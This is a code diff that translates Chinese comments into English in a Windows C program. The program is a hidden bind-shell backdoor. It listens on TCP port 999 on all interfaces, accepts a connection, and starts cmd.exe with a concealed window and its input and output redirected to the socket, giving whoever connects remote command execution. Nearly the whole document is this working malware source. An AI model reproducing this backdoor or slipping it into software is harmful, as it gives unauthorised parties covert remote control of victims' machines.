@@ -2,7 +2,8 @@
 #pragma comment(llinker,"subsystem:windows/entry:mainCRTStartup")
 #include<winsock2.h>
 #include<windows.h>
-#define MasterPort 999//定义监听端口999
+#define MasterPort 999 //define the listening port 999
+
 int main() {
 
 	WSADATA WSADa;
@@ -13,34 +14,34 @@ int main() {
 	STARTUPINFO StartupInfo;
 	char szCMDPath[255];
 
-	//分配内存资源，初始化数据
+	//allocate memory, initialize data
 	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
 	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
 	ZeroMemory(&WSADa, sizeof(WSADATA));
 
-	//获取cmd路径
+	//get the path of cmd
 	GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));
 
-	//加载ws2_32.dll
+	//load ws2_32.dll
 	WSAStartup(0x0202, &WSADa);
 
-	//设置本地信息和绑定协议，建立socket
+	//setting local information and protocol, create socket
 	SockAddrIn.sin_family = AF_INET;
 	SockAddrIn.sin_addr.s_addr = INADDR_ANY;
 	SockAddrIn.sin_port = htons(MasterPort);
 	CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 
-	//设置绑定端口999：
+	//bind the socket with the port 999
 	bind(CSocket, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));
 
-	//设置服务器端监听端口：
+	//set the server listening port
 	listen(CSocket, 1);
 
-	//开始连接远程服务器
+	//connect to the remote server
 	iAddrSize = sizeof(SockAddrIn);
 	SSocket = accept(CSocket, (sockaddr*)&SockAddrIn, &iAddrSize);
 	
-	//配置隐藏窗口结构体
+	//configure the concealed console structure
 	StartupInfo.cb = sizeof(STARTUPINFO);
 	StartupInfo.wShowWindow = SW_HIDE;
 	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
@@ -48,17 +49,17 @@ int main() {
 	StartupInfo.hStdOutput = (HANDLE)SSocket;
 	StartupInfo.hStdError = (HANDLE)SSocket;
 
-	//创建匿名管道:
+	//create anonymous pipe
 	CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
 	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
 	CloseHandle(ProcessInfo.hProcess);
 	CloseHandle(ProcessInfo.hThread);
 
-	//关闭进程句柄：
+	//close socket
 	closesocket(CSocket);
 	closesocket(SSocket);
 	
-	//关闭连接卸载ws2_32.dll
+	//unload ws2_32.dll
 	WSACleanup();
 	
 	return 0;
